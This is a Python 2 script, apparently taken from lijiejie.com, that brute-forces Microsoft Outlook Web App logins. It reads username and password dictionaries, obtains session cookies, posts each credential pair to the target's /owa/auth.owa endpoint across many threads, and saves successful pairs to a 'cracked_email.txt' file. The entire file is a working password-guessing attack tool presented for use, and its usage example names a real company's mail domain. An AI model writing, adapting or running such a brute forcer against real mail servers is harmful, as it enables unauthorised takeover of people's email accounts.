# Encoding=utf-8
# Outlook_mut_threa_bp.py From http://www.lijiejie.com

import argparse
import httplib
import urllib
import time
import threading
import Queue


parser = argparse.ArgumentParser(description='Microsoft OutLook WebAPP Brute Forcer.')
parser.add_argument('domain', type=str, help='website domain name, e.g. email.baidu.com')
parser.add_argument('users', type=str, help='username dict file path, e.g. users.txt')
parser.add_argument('passwords', type=str, help='passwords dict file path, e.g. passwords.dic')
parser.add_argument('threads', type=int, help='multi threads count')
args = parser.parse_args()

queue = Queue.Queue()
with open(args.users) as inFile:
    while True:
        user = inFile.readline().strip()
        if len(user) == 0: break
        queue.put(user)
for i in range(args.threads):
    queue.put(None)

passwords = []
with open(args.passwords) as inFile:
    while True:
        pwd = inFile.readline().strip()
        if len(pwd) == 0: break
        passwords.append(pwd)
        
headers = {
    'Accept': '*/*',
    'Referer': 'https://' + args.domain + '/owa/auth/logon.aspx?replaceCurrent=1&reason=2&url=https%3a%2f%2f' + args.domain + '%2fowa%2f',
    'Accept-Language': 'zh-CN',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; ',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache',
    'Cookie': '',
}

lock = threading.Lock()
def tryUser():
    while True:
        user = queue.get()
        if user == None:
            queue.task_done()
            break
        for pwd in passwords:
            pwd = pwd.replace('<user>', user)
            lock.acquire()
            print 'testing', user, ' -- ', pwd
            lock.release()
            while True:
                try:
                    conn = httplib.HTTPSConnection(args.domain)
                    conn.request(method='GET', url='/owa/')
                    res = dict(conn.getresponse().getheaders())
                    break
                except:
                    print '!!!Error occured #1'
            session = res['set-cookie'].split(';')[0]     # Get Session ID
            conn.close()
            headers2 = headers
            headers2['Cookie'] = 'OutlookSession=%s ; PBack=0' % session
            data = {'destination': 'https://%s/owa/' % args.domain,
                    'flags': '0', 'forcedownlevel': '0', 'trusted':'0',
                    'username':user, 'password':pwd,
                    'isUtf8':'1', 'Cookie': 'OutlookSession=%s; PBack=0' % session}
            while True:
                try:
                    conn = httplib.HTTPSConnection(args.domain)
                    conn.request(method='POST', url='/owa/auth.owa', body=urllib.urlencode(data), headers=headers2)
                    break
                except:
                    print '!!!Error occured #2'
            url = dict( conn.getresponse().getheaders() )['location']
            if url.find('reason=') < 0:
                lock.acquire()
                print '(SUCESS)>> User:', user, 'Password:', pwd
                with open('cracked_email.txt', 'a') as outFile:
                    outFile.write(user + ' ' + pwd + '\n')
                lock.release()
            conn.close()

threads = []
for i in range(args.threads):
    t = threading.Thread(target=tryUser)
    t.start()

for t in threads:
    t.join()